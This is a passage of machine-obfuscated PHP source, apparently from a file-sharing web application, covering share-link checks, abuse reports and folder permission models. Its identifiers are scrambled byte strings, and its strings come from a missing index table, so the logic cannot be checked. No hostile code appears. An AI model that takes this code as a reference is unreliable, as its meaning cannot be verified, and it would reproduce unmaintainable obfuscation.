AÓÌÎ·√üº; AÓÌÎ·√üº: $this->_checkLinkShare($DÈ—Ç÷´…ã, $CÖÜñ∑äÒå); $Aπà„âÇ•• = array(); $aÓëá†ë–Ñ = explode($aÁ÷ÿÒ¡¨¡[47], $aÁ÷ÿÒ¡¨¡[1881]); goto FÉÙŸ–√ ◊; c‚ÑÍÖÓ™Î: if (isset($DÈ—Ç÷´…ã[$aÁ÷ÿÒ¡¨¡[1870]])) { $this->_shareAuthSet($A‰¨ÒÀÍäõ, $DÈ—Ç÷´…ã[$aÁ÷ÿÒ¡¨¡[1870]]); } return !0; goto C∂ã•èø–º; FÉÙŸ–√ ◊: foreach ($aÓëá†ë–Ñ as $bú‘í›ﬂÉÎ) { if (!array_key_exists($bú‘í›ﬂÉÎ, $DÈ—Ç÷´…ã)) { continue; } $Aπà„âÇ••[$bú‘í›ﬂÉÎ] = $DÈ—Ç÷´…ã[$bú‘í›ﬂÉÎ]; } $this->shareEventAdd($CÖÜñ∑äÒå[$aÁ÷ÿÒ¡¨¡[397]], $DÈ—Ç÷´…ã, $aÁ÷ÿÒ¡¨¡[1693]); $this->where(array($aÁ÷ÿÒ¡¨¡[481] => $A‰¨ÒÀÍäõ))->save($Aπà„âÇ••); goto c‚ÑÍÖÓ™Î; C∂ã•èø–º: } private function _checkLinkShare($fûÜå‰›¢À, $dŸ¿ØèÀáØ) { goto E“«Ïê€õæ; Eñ¥◊À®ù: $b›ÿèµ‚Ñœ = $this->shareFileMeta($eî›®‹›Ñá[$Bø–ê≥ûÜó[461]]); if (isset($b›ÿèµ‚Ñœ[$Bø–ê≥ûÜó[372]]) && $b›ÿèµ‚Ñœ[$Bø–ê≥ûÜó[372]] == $Bø–ê≥ûÜó[87]) { show_json(LNG($Bø–ê≥ûÜó[1884]), !1); } goto aí √ö›»¥; E“«Ïê€õæ: $Bø–ê≥ûÜó =& $_SERVER[’ÿƒ†ïò]; if ($fûÜå‰›¢À[$Bø–ê≥ûÜó[487]] != $Bø–ê≥ûÜó[87]) { return; } $cèâçÒÍáç = $dŸ¿ØèÀáØ[$Bø–ê≥ûÜó[85]][$Bø–ê≥ûÜó[397]]; goto CéËÖ∞ø´õ; CéËÖ∞ø´õ: if ($dŸ¿ØèÀáØ[$Bø–ê≥ûÜó[85]][$Bø–ê≥ûÜó[29]] != $Bø–ê≥ûÜó[193]) { $eÚÚ“Ë∫◊” = $this->_folderReport($cèâçÒÍáç); if (!$eÚÚ“Ë∫◊”) { return; } show_json(LNG($Bø–ê≥ûÜó[1882]) . $Bø–ê≥ûÜó[1883] . $eÚÚ“Ë∫◊”, !1); } $eî›®‹›Ñá = Model($Bø–ê≥ûÜó[820])->fileInfoGet($dŸ¿ØèÀáØ[$Bø–ê≥ûÜó[85]][$Bø–ê≥ûÜó[397]]); if (!$eî›®‹›Ñá) { return; } goto Eñ¥◊À®ù; aí √ö›»¥: } private function _folderReport($C†¿ÆÉß»Ó) { goto fÏπÆŸï‘‹; fÏπÆŸï‘‹: $C˘§Ù§‡ï° =& $_SERVER[’ÿƒ†ïò]; $dØﬁ•êü ô = array($C˘§Ù§‡ï°[461] => array($C˘§Ù§‡ï°[999], 0), $C˘§Ù§‡ï°[738] => 3); $EÊº¯Ë´‚– = Model($C˘§Ù§‡ï°[1885])->where($dØﬁ•êü ô)->field($C˘§Ù§‡ï°[461])->select(); goto Cöº¿ôô„˘; Cöº¿ôô„˘: if (!$EÊº¯Ë´‚–) { return !1; } $EÊº¯Ë´‚– = array_to_keyvalue($EÊº¯Ë´‚–, $C˘§Ù§‡ï°[33], $C˘§Ù§‡ï°[461]); $fáÏÀœºÙÓ = $C˘§Ù§‡ï°[47] . $C†¿ÆÉß»Ó . $C˘§Ù§‡ï°[47]; goto eï±Á√ÓΩÖ; Aî∑ˆ§∂î◊: $dÿÊ–Üö±Ï = array_to_keyvalue($AŒ—ﬁìöüÁ, $C˘§Ù§‡ï°[33], $C˘§Ù§‡ï°[28]); $dÿÊ–Üö±Ï[] = $C«∞°öÓêå[$C˘§Ù§‡ï°[28]]; return implode($C˘§Ù§‡ï°[8], $dÿÊ–Üö±Ï); goto eΩ«ŒüÖ±Ò; a∂¡µîËÒ√: $DÔ’ÏäÀöı = substr($C«∞°öÓêå[$C˘§Ù§‡ï°[515]], strpos($C«∞°öÓêå[$C˘§Ù§‡ï°[515]], $fáÏÀœºÙÓ)); $dØﬁ•êü ô = array($C˘§Ù§‡ï°[397] => array($C˘§Ù§‡ï°[7], trim($DÔ’ÏäÀöı, $C˘§Ù§‡ï°[47]))); $AŒ—ﬁìöüÁ = Model($C˘§Ù§‡ï°[820])->where($dØﬁ•êü ô)->field($C˘§Ù§‡ï°[28])->select(); goto Aî∑ˆ§∂î◊; eï±Á√ÓΩÖ: $dØﬁ•êü ô = array($C˘§Ù§‡ï°[461] => array($C˘§Ù§‡ï°[7], $EÊº¯Ë´‚–), $C˘§Ù§‡ï°[515] => array($C˘§Ù§‡ï°[381], "\x25{$fáÏÀœºÙÓ}\45"), $C˘§Ù§‡ï°[425] => 0); $C«∞°öÓêå = Model($C˘§Ù§‡ï°[820])->where($dØﬁ•êü ô)->field($C˘§Ù§‡ï°[1886])->find(); if (!$C«∞°öÓêå) { return !1; } goto a∂¡µîËÒ√; eΩ«ŒüÖ±Ò: } protected function remove($F»ùπÉÇ§é) { goto EÙìã„≠¥∞; Bç√˜÷ŒÇ—: for ($f“—ó«Ñâ• = 0; $f“—ó«Ñâ• < count($d§é∫⁄≈ƒ«); $f“—ó«Ñâ•++) { $eøËﬂ¢ó’Œ = $this->getInfo($d§é∫⁄≈ƒ«[$f“—ó«Ñâ•]); if ($eøËﬂ¢ó’Œ[$e¯ÎÏÌçÒ°[489]] == $e¯ÎÏÌçÒ°[87]) { Model($e¯ÎÏÌçÒ°[558])->eventShare($eøËﬂ¢ó’Œ[$e¯ÎÏÌçÒ°[397]], $e¯ÎÏÌçÒ°[1875]); } if ($eøËﬂ¢ó’Œ[$e¯ÎÏÌçÒ°[487]] == $e¯ÎÏÌçÒ°[87]) { Model($e¯ÎÏÌçÒ°[558])->eventShare($eøËﬂ¢ó’Œ[$e¯ÎÏÌçÒ°[397]], $e¯ÎÏÌçÒ°[1874]); } } return $aÕºÆè∞ÿÿ; goto bËã”–ØØÁ; EÙìã„≠¥∞: $e¯ÎÏÌçÒ° =& $_SERVER[’ÿƒ†ïò]; if (is_array($F»ùπÉÇ§é)) { $F»ùπÉÇ§é = array($e¯ÎÏÌçÒ°[7], $F»ùπÉÇ§é); } $C…◊û∫ÓÆ‹ = array($e¯ÎÏÌçÒ°[482] => $F»ùπÉÇ§é); goto c”Éö€£ÊÂ; c”Éö€£ÊÂ: $aÕºÆè∞ÿÿ = $this->where($C…◊û∫ÓÆ‹)->delete(); if ($aÕºÆè∞ÿÿ) { Model($e¯ÎÏÌçÒ°[590])->where(array($e¯ÎÏÌçÒ°[482] => $F»ùπÉÇ§é))->delete(); } $d§é∫⁄≈ƒ« = is_array($F»ùπÉÇ§é) ? $F»ùπÉÇ§é[1] : array($F»ùπÉÇ§é); goto Bç√˜÷ŒÇ—; bËã”–ØØÁ: } protected function removeBySource($dπ©˘Üé…ò) { goto fÜ”»⁄ÒÙÖ; fÑ≥âÜƒè°: $E¯–Áœ¬®Ÿ = array_to_keyvalue($E¯–Áœ¬®Ÿ, $fïÇúÊˆÙ„[33], $fïÇúÊˆÙ„[482]); if (!$E¯–Áœ¬®Ÿ) { return; } $C§⁄øÊÃ‡Á = array($fïÇúÊˆÙ„[481] => array($fïÇúÊˆÙ„[413], $E¯–Áœ¬®Ÿ)); goto dàÉôëß‘; fÜ”»⁄ÒÙÖ: $fïÇúÊˆÙ„ =& $_SERVER[’ÿƒ†ïò]; $C§⁄øÊÃ‡Á = array($fïÇúÊˆÙ„[412] => array($fïÇúÊˆÙ„[413], $dπ©˘Üé…ò)); $E¯–Áœ¬®Ÿ = $this->field($fïÇúÊˆÙ„[482])->where($C§⁄øÊÃ‡Á)->select(); goto fÑ≥âÜƒè°; dàÉôëß‘: $this->where($C§⁄øÊÃ‡Á)->delete(); Model($fïÇúÊˆÙ„[590])->where($C§⁄øÊÃ‡Á)->delete(); goto E≤¥’∏ëò«; E≤¥’∏ëò«: } public function listAll($fˆû«≠É®Á) { goto E∏í†ˆÛ’; E∏í†ˆÛ’: $fçíåº∑Âî =& $_SERVER[’ÿƒ†ïò]; $D¢õ≈ﬁÚùñ = array(); if ($fˆû«≠É®Á[$fçíåº∑Âî[1557]]) { $D¢õ≈ﬁÚùñ[$fçíåº∑Âî[1557]] = $fˆû«≠É®Á[$fçíåº∑Âî[1557]]; } goto D«æ•ÕΩ∏•; f◊Ùº†÷ ∫: return $cëôâ˜Üä≥; goto aÿ¢çáú Û; AÑﬁÁàæ‘ù: $cëôâ˜Üä≥ = $this->_makeOrder()->where($D¢õ≈ﬁÚùñ)->selectPage(20); if (empty($cëôâ˜Üä≥[$fçíåº∑Âî[367]])) { return array(); } $this->_listDataApply($cëôâ˜Üä≥[$fçíåº∑Âî[367]]); goto f◊Ùº†÷ ∫; D«æ•ÕΩ∏•: if ($fˆû«≠É®Á[$fçíåº∑Âî[749]]) { $F∫¨ïàŒÉ• = $fˆû«≠É®Á[$fçíåº∑Âî[490]] ? $fˆû«≠É®Á[$fçíåº∑Âî[490]] : strtotime(date($fçíåº∑Âî[1887])); $D¢õ≈ﬁÚùñ[$fçíåº∑Âî[194]] = array($fçíåº∑Âî[331], array($fˆû«≠É®Á[$fçíåº∑Âî[749]], $F∫¨ïàŒÉ•)); } if ($fˆû«≠É®Á[$fçíåº∑Âî[29]]) { $D¢õ≈ﬁÚùñ[$fˆû«≠É®Á[$fçíåº∑Âî[29]]] = 1; } else { $D¢õ≈ﬁÚùñ[] = array($fçíåº∑Âî[487] => array($fçíåº∑Âî[999], 0), $fçíåº∑Âî[489] => array($fçíåº∑Âî[999], 0), $fçíåº∑Âî[1864] => $fçíåº∑Âî[1818]); } if ($fˆû«≠É®Á[$fçíåº∑Âî[1814]]) { $D¢õ≈ﬁÚùñ[] = array($fçíåº∑Âî[484] => $fˆû«≠É®Á[$fçíåº∑Âî[1814]], $fçíåº∑Âî[1460] => array($fçíåº∑Âî[381], "\45{$fˆû«≠É®Á[$fçíåº∑Âî[1814]]}\45"), $fçíåº∑Âî[1864] => $fçíåº∑Âî[1818]); } goto AÑﬁÁàæ‘ù; aÿ¢çáú Û: } public function listDataApply($eı≈≤◊è è) { $this->_listDataApply($eı≈≤◊è è); return $eı≈≤◊è è; } private function _listDataApply(&$Aˆƒ†ÀÊˆ) { goto D¡—’Ùèóä; D¡—’Ùèóä: $aµﬂÈÖ√à” =& $_SERVER[’ÿƒ†ïò]; $eªî‰±¶ÌÁ = array_to_keyvalue($Aˆƒ†ÀÊˆ, $aµﬂÈÖ√à”[33], $aµﬂÈÖ√à”[1557]); $AÜÿ◊Ûèó– = Model($aµﬂÈÖ√à”[532])->userListInfo(array_unique($eªî‰±¶ÌÁ)); goto aÉ¶’áè·¥; bƒÉìÂÑö›: unset($bÖÀªßôó≈); $Aˆƒ†ÀÊˆ = array_values($Aˆƒ†ÀÊˆ); goto A®í∆áﬁø; aÉ¶’áè·¥: $B‘ã—ÇÑÊ = array_to_keyvalue($Aˆƒ†ÀÊˆ, $aµﬂÈÖ√à”[33], $aµﬂÈÖ√à”[397]); $B¯≥‹–€∆é = Model($aµﬂÈÖ√à”[820])->sourceListInfo($B‘ã—ÇÑÊ, !0); foreach ($Aˆƒ†ÀÊˆ as $AªÓëâ¶ˆé => &$bÖÀªßôó≈) { $A¬ÑÖö¬Ú∞ = $bÖÀªßôó≈[$aµﬂÈÖ√à”[1557]]; $bÖÀªßôó≈[$aµﬂÈÖ√à”[1888]] = $AÜÿ◊Ûèó–[$A¬ÑÖö¬Ú∞] ? $AÜÿ◊Ûèó–[$A¬ÑÖö¬Ú∞] : !1; $B≈ô„¨‹ûœ = $bÖÀªßôó≈[$aµﬂÈÖ√à”[397]]; $bÖÀªßôó≈[$aµﬂÈÖ√à”[85]] = $B¯≥‹–€∆é[$B≈ô„¨‹ûœ] ? $B¯≥‹–€∆é[$B≈ô„¨‹ûœ] : !1; if ($bÖÀªßôó≈[$aµﬂÈÖ√à”[85]][$aµﬂÈÖ√à”[425]] == $aµﬂÈÖ√à”[87]) { unset($Aˆƒ†ÀÊˆ[$AªÓëâ¶ˆé]); } if ($bÖÀªßôó≈[$aµﬂÈÖ√à”[85]] != $aµﬂÈÖ√à”[191] && !$bÖÀªßôó≈[$aµﬂÈÖ√à”[85]]) { unset($Aˆƒ†ÀÊˆ[$AªÓëâ¶ˆé]); } } goto bƒÉìÂÑö›; A®í∆áﬁø: } private function _makeOrder($b‹µˆÀ∆ã◊ = '') { goto B≤¿é„ˆèƒ; B≤¿é„ˆèƒ: $bÍÀñ÷√Ò” =& $_SERVER[’ÿƒ†ïò]; $fŸäˆº¥ìı = array($bÍÀñ÷√Ò”[194], $bÍÀñ÷√Ò”[490], $bÍÀñ÷√Ò”[1877], $bÍÀñ÷√Ò”[1878]); $A’Ò›Ë∏Ì∏ = array($bÍÀñ÷√Ò”[442] => $bÍÀñ÷√Ò”[443], $bÍÀñ÷√Ò”[444] => $bÍÀñ÷√Ò”[445]); goto cÑ”ãàÙ∑Ÿ; BÓ“±‘§úÌ: $b‹µˆÀ∆ã◊ = $b‹µˆÀ∆ã◊ . "{$bÚÿœ£ëÚ}\40{$F…◊Û”Á¡—}"; return $this->order($b‹µˆÀ∆ã◊); goto aû›ßúÜŸ∑; cÑ”ãàÙ∑Ÿ: $bÚÿœ£ëÚ = Input::get($bÍÀñ÷√Ò”[449], $bÍÀñ÷√Ò”[7], $bÍÀñ÷√Ò”[418], $fŸäˆº¥ìı); $F…◊Û”Á¡— = Input::get($bÍÀñ÷√Ò”[450], $bÍÀñ÷√Ò”[7], $bÍÀñ÷√Ò”[1889], array($bÍÀñ÷√Ò”[1813], $bÍÀñ÷√Ò”[444])); $F…◊Û”Á¡— = $A’Ò›Ë∏Ì∏[$F…◊Û”Á¡—]; goto BÓ“±‘§úÌ; aû›ßúÜŸ∑: } public function reportAdd($DÁ£Ö˘Ò˘ﬁ) { $A˜Ü ÕÌıÃ =& $_SERVER[’ÿƒ†ïò]; $D¬àÖËäπø = array($A˜Ü ÕÌıÃ[482] => $DÁ£Ö˘Ò˘ﬁ[$A˜Ü ÕÌıÃ[482]], $A˜Ü ÕÌıÃ[1557] => USER_ID); if (Model($A˜Ü ÕÌıÃ[1885])->where($D¬àÖËäπø)->find()) { return !1; } $Dæî„√Ííî = array($A˜Ü ÕÌıÃ[482] => $DÁ£Ö˘Ò˘ﬁ[$A˜Ü ÕÌıÃ[482]], $A˜Ü ÕÌıÃ[1460] => $DÁ£Ö˘Ò˘ﬁ[$A˜Ü ÕÌıÃ[1460]], $A˜Ü ÕÌıÃ[397] => $DÁ£Ö˘Ò˘ﬁ[$A˜Ü ÕÌıÃ[397]], $A˜Ü ÕÌıÃ[461] => $DÁ£Ö˘Ò˘ﬁ[$A˜Ü ÕÌıÃ[461]], $A˜Ü ÕÌıÃ[1557] => USER_ID, $A˜Ü ÕÌıÃ[29] => $DÁ£Ö˘Ò˘ﬁ[$A˜Ü ÕÌıÃ[29]], $A˜Ü ÕÌıÃ[445] => $DÁ£Ö˘Ò˘ﬁ[$A˜Ü ÕÌıÃ[445]]); return Model($A˜Ü ÕÌıÃ[1885])->add($Dæî„√Ííî); } public function reportList($EÒûÿÛ≥‡“) { goto FØóÛÆ™¿ ; Fπÿûè¶π´: if (isset($EÒûÿÛ≥‡“[$b«‚£“”£ò[29]]) && in_array($EÒûÿÛ≥‡“[$b«‚£“”£ò[29]], array($b«‚£“”£ò[87], $b«‚£“”£ò[429], $b«‚£“”£ò[1890], $b«‚£“”£ò[1891], $b«‚£“”£ò[1892]))) { $C©¢”Ω™±Ñ[$b«‚£“”£ò[29]] = $EÒûÿÛ≥‡“[$b«‚£“”£ò[29]]; } if (isset($EÒûÿÛ≥‡“[$b«‚£“”£ò[738]]) && in_array($EÒûÿÛ≥‡“[$b«‚£“”£ò[738]], array($b«‚£“”£ò[191], $b«‚£“”£ò[87], $b«‚£“”£ò[429], $b«‚£“”£ò[1890]))) { $C©¢”Ω™±Ñ[$b«‚£“”£ò[738]] = $EÒûÿÛ≥‡“[$b«‚£“”£ò[738]]; } $f’øÜØù•‰ = Input::get($b«‚£“”£ò[450], $b«‚£“”£ò[7], $b«‚£“”£ò[1889], array($b«‚£“”£ò[1813], $b«‚£“”£ò[444])); goto fûóçâêˆ√; eø•”‹áóó: $this->_listDataApply($c√≥îŒˆ˜ˆ[$b«‚£“”£ò[367]]); return $c√≥îŒˆ˜ˆ; goto Aóó†ßÛåÎ; FØóÛÆ™¿ : $b«‚£“”£ò =& $_SERVER[’ÿƒ†ïò]; $C©¢”Ω™±Ñ = array(); if ($EÒûÿÛ≥‡“[$b«‚£“”£ò[749]]) { $dçÜÏÔ’¨¢ = $EÒûÿÛ≥‡“[$b«‚£“”£ò[490]] ? $EÒûÿÛ≥‡“[$b«‚£“”£ò[490]] : strtotime(date($b«‚£“”£ò[1887])); $C©¢”Ω™±Ñ[$b«‚£“”£ò[194]] = array($b«‚£“”£ò[331], array($EÒûÿÛ≥‡“[$b«‚£“”£ò[749]], $dçÜÏÔ’¨¢)); } goto Fπÿûè¶π´; B–ºüü†¢√: if (empty($c√≥îŒˆ˜ˆ[$b«‚£“”£ò[367]])) { return array(); } $aÃÔûÖ⁄çÑ = array_to_keyvalue_group($c√≥îŒˆ˜ˆ[$b«‚£“”£ò[367]], $b«‚£“”£ò[738], $b«‚£“”£ò[482]); if (!empty($aÃÔûÖ⁄çÑ[0])) { $EÒûÿÛ≥‡“ = $aÃÔûÖ⁄çÑ[0]; $C©¢”Ω™±Ñ = array($b«‚£“”£ò[482] => array($b«‚£“”£ò[7], $EÒûÿÛ≥‡“)); $A°™ª∞õÜé = $this->where($C©¢”Ω™±Ñ)->field($b«‚£“”£ò[482])->select(); $A°™ª∞õÜé = array_to_keyvalue($A°™ª∞õÜé, $b«‚£“”£ò[33], $b«‚£“”£ò[482]); $bÜ‹…‘Ÿç± = array_diff($EÒûÿÛ≥‡“, $A°™ª∞õÜé); if (!empty($bÜ‹…‘Ÿç±)) { foreach ($c√≥îŒˆ˜ˆ[$b«‚£“”£ò[367]] as $E◊øœÊÜπ‡ => $a‹Òøäâü√) { if (in_array($a‹Òøäâü√[$b«‚£“”£ò[482]], $bÜ‹…‘Ÿç±)) { unset($c√≥îŒˆ˜ˆ[$b«‚£“”£ò[367]][$E◊øœÊÜπ‡]); } } } } goto eø•”‹áóó; fûóçâêˆ√: $a≤»´òè‰ù = array($b«‚£“”£ò[442] => $b«‚£“”£ò[443], $b«‚£“”£ò[444] => $b«‚£“”£ò[445]); $f∞‚±â≥ô≥ = $b«‚£“”£ò[1893] . $a≤»´òè‰ù[$f’øÜØù•‰]; $c√≥îŒˆ˜ˆ = Model($b«‚£“”£ò[1885])->where($C©¢”Ω™±Ñ)->order($f∞‚±â≥ô≥)->selectPage(20); goto B–ºüü†¢√; Aóó†ßÛåÎ: } public function reportStatus($FÂ¿≈ä≠úç) { goto b≥÷â€Á»Ñ; c¡º“´„öß: return $e≤ºÛÍ‚ÃÜ; goto Eêƒ£êÕ§ƒ; cÙ¿⁄¯Ÿí‹: $e≤ºÛÍ‚ÃÜ = Model($d…Óµ⁄ü±â[1885])->where($E∫‘≠∫‹öﬁ)->save($D◊ÑÑÉ—ã¬); if ($FÂ¿≈ä≠úç[$d…Óµ⁄ü±â[738]] == $d…Óµ⁄ü±â[429]) { if ($e¿ÉÛÇ ãû[$d…Óµ⁄ü±â[461]] != $d…Óµ⁄ü±â[191] && $this->shareFileMeta($e¿ÉÛÇ ãû[$d…Óµ⁄ü±â[461]])) { $this->shareFileMeta($e¿ÉÛÇ ãû[$d…Óµ⁄ü±â[461]], 0); } $this->remove($e¿ÉÛÇ ãû[$d…Óµ⁄ü±â[482]]); return !0; } if ($e≤ºÛÍ‚ÃÜ && $FÂ¿≈ä≠úç[$d…Óµ⁄ü±â[738]] == $d…Óµ⁄ü±â[1890]) { $CÛ©¥¡…∂ó = $D◊ÑÑÉ—ã¬[$d…Óµ⁄ü±â[738]] == $d…Óµ⁄ü±â[1890] ? 1 : 0; $this->shareFileMeta($e¿ÉÛÇ ãû[$d…Óµ⁄ü±â[461]], $CÛ©¥¡…∂ó); $this->removeByFile($e¿ÉÛÇ ãû[$d…Óµ⁄ü±â[461]]); } goto c¡º“´„öß; b≥÷â€Á»Ñ: $d…Óµ⁄ü±â =& $_SERVER[’ÿƒ†ïò]; $E∫‘≠∫‹öﬁ = array($d…Óµ⁄ü±â[395] => $FÂ¿≈ä≠úç[$d…Óµ⁄ü±â[395]]); $e¿ÉÛÇ ãû = Model($d…Óµ⁄ü±â[1885])->where($E∫‘≠∫‹öﬁ)->field($d…Óµ⁄ü±â[1894])->find(); goto Bò¢ç©∆“±; Bò¢ç©∆“±: if (!$e¿ÉÛÇ ãû) { return !1; } $D◊ÑÑÉ—ã¬ = array($d…Óµ⁄ü±â[738] => $FÂ¿≈ä≠úç[$d…Óµ⁄ü±â[738]]); if ($FÂ¿≈ä≠úç[$d…Óµ⁄ü±â[738]] == $d…Óµ⁄ü±â[1890] && $e¿ÉÛÇ ãû[$d…Óµ⁄ü±â[738]] == $d…Óµ⁄ü±â[1890]) { $D◊ÑÑÉ—ã¬[$d…Óµ⁄ü±â[738]] = 0; } goto cÙ¿⁄¯Ÿí‹; Eêƒ£êÕ§ƒ: } private function removeByFile($A¡óÿÍ≈£Ç) { goto a⁄ºÌÑæïÉ; DÒ‹ÁÚÔ±…: $bÜ√äÔœåÚ = array_to_keyvalue($CÀ˜™ùÒøΩ, $dÈ©ç„√í•[33], $dÈ©ç„√í•[482]); $this->remove($bÜ√äÔœåÚ); goto Bæ»Ô¢Üì; a⁄ºÌÑæïÉ: $dÈ©ç„√í• =& $_SERVER[’ÿƒ†ïò]; $CÀ˜™ùÒøΩ = Model($dÈ©ç„√í•[820])->where(array($dÈ©ç„√í•[461] => $A¡óÿÍ≈£Ç))->field($dÈ©ç„√í•[397])->select(); $BíÃ÷˘ºÆÉ = array_to_keyvalue($CÀ˜™ùÒøΩ, $dÈ©ç„√í•[33], $dÈ©ç„√í•[397]); goto eæÑ·∫®äÂ; eæÑ·∫®äÂ: $bèàÖƒä∏œ = array($dÈ©ç„√í•[397] => array($dÈ©ç„√í•[7], $BíÃ÷˘ºÆÉ), $dÈ©ç„√í•[487] => 1); $CÀ˜™ùÒøΩ = $this->where($bèàÖƒä∏œ)->field($dÈ©ç„√í•[482])->select(); if (empty($CÀ˜™ùÒøΩ)) { return; } goto DÒ‹ÁÚÔ±…; Bæ»Ô¢Üì: } private function shareFileMeta($D±ò≈©äé∆, $bì€≥òù∑ﬁ = null) { $E§´§ÆáÂÇ =& $_SERVER[’ÿƒ†ïò]; $A∫éÁ«„åÙ = array($E§´§ÆáÂÇ[461] => $D±ò≈©äé∆, $E§´§ÆáÂÇ[93] => $E§´§ÆáÂÇ[1895]); if (is_null($bì€≥òù∑ﬁ)) { return Model($E§´§ÆáÂÇ[1896])->where($A∫éÁ«„åÙ)->find(); } $A∫éÁ«„åÙ[$E§´§ÆáÂÇ[372]] = $bì€≥òù∑ﬁ; Model($E§´§ÆáÂÇ[1896])->add($A∫éÁ«„åÙ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\x72\143\x65\137\141\x75\x74\x68"; public function getAuth($AÎæ›¢ÎÒ¨) { goto DÇ´•ÑÆÓÇ; DÇ´•ÑÆÓÇ: $b∫≈ßÒ∑õ∑ =& $_SERVER[’ÿƒ†ïò]; $b‘ßˆªÁÉ¬ = $this->sourceAuthSelect($AÎæ›¢ÎÒ¨); $C§ÖÁÕÓøü = array(); goto DŸÑ£ÖÆêö; AÚ©çºÛ’–: array_multisort($D≥ãûΩ€í†, SORT_DESC, $C§ÖÁÕÓøü); return $C§ÖÁÕÓøü; goto B§Ù∂ÁÃ–Ω; DŸÑ£ÖÆêö: $D≥ãûΩ€í† = array(); $BŸ®ç∏„ï« = 2 << 25; foreach ($b‘ßˆªÁÉ¬ as $EŸáÚ©ÚÎÿ) { goto dŒ£´èç·ú; dŒ£´èç·ú: $dìœ„Œà¢ = Model($b∫≈ßÒ∑õ∑[501])->listData($EŸáÚ©ÚÎÿ[$b∫≈ßÒ∑õ∑[1826]]); if (!$dìœ„Œà¢) { continue; } $C§ÖÁÕÓøü[] = $EŸáÚ©ÚÎÿ; goto C¿‰üã•àÖ; C¿‰üã•àÖ: $aÊ„ı–ãœâ = 0; if ($EŸáÚ©ÚÎÿ[$b∫≈ßÒ∑õ∑[406]] == SourceModel::TYPE_GROUP) { $aÊ„ı–ãœâ = $BŸ®ç∏„ï« * 2; } if ($EŸáÚ©ÚÎÿ[$b∫≈ßÒ∑õ∑[406]] == SourceModel::TYPE_USER) { $aÊ„ı–ãœâ = $BŸ®ç∏„ï«; } goto c’®ç˘«Ê´; c’®ç˘«Ê´: if ($EŸáÚ©ÚÎÿ[$b∫≈ßÒ∑õ∑[406]] == SourceModel::TYPE_USER && $EŸáÚ©ÚÎÿ[$b∫≈ßÒ∑õ∑[498]] == $b∫≈ßÒ∑õ∑[191]) { $aÊ„ı–ãœâ = 0; } $D≥ãûΩ€í†[] = $dìœ„Œà¢[$b∫≈ßÒ∑õ∑[408]] + $aÊ„ı–ãœâ; goto aÊˆﬁÒÈÓä; aÊˆﬁÒÈÓä: } goto AÚ©çºÛ’–; B§Ù∂ÁÃ–Ω: } public function sourceAuthSelect($f ë¶Ü“ü∫) { goto còÓÿúÓ≥É; d¡å‰…áç¡: if ($Eﬁ≤Á´πñµ) { return $DïÓÿÑ≥‡‹; } return $BÃ∏¡´; goto bÌ¬Ø⁄ãîé; A÷ñ ÙÈæß: if (count($F§èó„¥Ñ¿) == count($f ë¶Ü“ü∫)) { return $Eﬁ≤Á´πñµ ? $F§èó„¥Ñ¿[$f ë¶Ü“ü∫[0]] : $F§èó„¥Ñ¿; } $déﬂòŸÀø∆ = $b†Ç®ƒ⁄Âπ[1897]; $AÇñóŸãÜ√ = array($b†Ç®ƒ⁄Âπ[397] => array($b†Ç®ƒ⁄Âπ[7], $f ë¶Ü“ü∫)); goto a“Ï˘ú»Ÿ; còÓÿúÓ≥É: $b†Ç®ƒ⁄Âπ =& $_SERVER[’ÿƒ†ïò]; static $f ﬂüøΩ¬ı = array(); $Eﬁ≤Á´πñµ = is_array($f ë¶Ü“ü∫) ? !1 : !0; goto bﬁÔÇÂÜ—Ø; bﬁÔÇÂÜ—Ø: if ($Eﬁ≤Á´πñµ) { $f ë¶Ü“ü∫ = array($f ë¶Ü“ü∫); } $F§èó„¥Ñ¿ = array(); foreach ($f ë¶Ü“ü∫ as $AÑ®‚«≠Ùã) { if (isset($f ﬂüøΩ¬ı[$AÑ®‚«≠Ùã])) { $F§èó„¥Ñ¿[$AÑ®‚«≠Ùã] = $f ﬂüøΩ¬ı[$AÑ®‚«≠Ùã]; } } goto A÷ñ ÙÈæß; a“Ï˘ú»Ÿ: $DïÓÿÑ≥‡‹ = $this->field($déﬂòŸÀø∆)->order($b†Ç®ƒ⁄Âπ[395])->where($AÇñóŸãÜ√)->select(); $BÃ∏¡´ = array_to_keyvalue_group($DïÓÿÑ≥‡‹, $b†Ç®ƒ⁄Âπ[397]); foreach ($f ë¶Ü“ü∫ as $AÑ®‚«≠Ùã) { $f ﬂüøΩ¬ı[$AÑ®‚«≠Ùã] = $BÃ∏¡´[$AÑ®‚«≠Ùã] ? $BÃ∏¡´[$AÑ®‚«≠Ùã] : array(); } goto d¡å‰…áç¡; bÌ¬Ø⁄ãîé: } public function setAuth($cÃ∏ù∑Æí, $A¡ª„†£ùÆ) { goto BƒŸ©´†Ü¶; DœŸÀÎ≠áË: if ($d§ŒıÌÇ∆¥ != $aªºÖ˘…á¯) { $F˜œ´“§Úë = array($A¿á±»≥ï∞[1726] => $d§ŒıÌÇ∆¥); $Cç≈™Âì˜à = Model($A¿á±»≥ï∞[1812])->field($A¿á±»≥ï∞[1557])->where($F˜œ´“§Úë)->select(); $Cç≈™Âì˜à = array_to_keyvalue($Cç≈™Âì˜à, $A¿á±»≥ï∞[33], $A¿á±»≥ï∞[1557]); } $a€“‘Èü≤é = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Cî—Íàøë⁄ = array(); goto BùâûöÕàç; BƒŸ©´†Ü¶: $A¿á±»≥ï∞ =& $_SERVER[’ÿƒ†ïò]; $c“∑÷≠ÉÃä = Model($A¿á±»≥ï∞[1234])->sourceInfo($cÃ∏ù∑Æí); if (!$c“∑÷≠ÉÃä) { return !1; } goto c±‹ı∞Î¿†; EÙ◊◊∏îã•: return !0; goto aî…ê»—®“; BùâûöÕàç: foreach ($A¡ª„†£ùÆ as $f≥’ÕøÏ’Õ) { if (!in_array($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[406]], $a€“‘Èü≤é)) { show_json(LNG($A¿á±»≥ï∞[1898]), !1); } if ($d§ŒıÌÇ∆¥ != $aªºÖ˘…á¯) { if ($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[406]] == SourceModel::TYPE_GROUP) { } if ($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[498]] != 0 && !in_array($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[498]], $Cç≈™Âì˜à)) { } } if ($f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[498]] == 0) { $f≥’ÕøÏ’Õ[$A¿á±»≥ï∞[406]] = 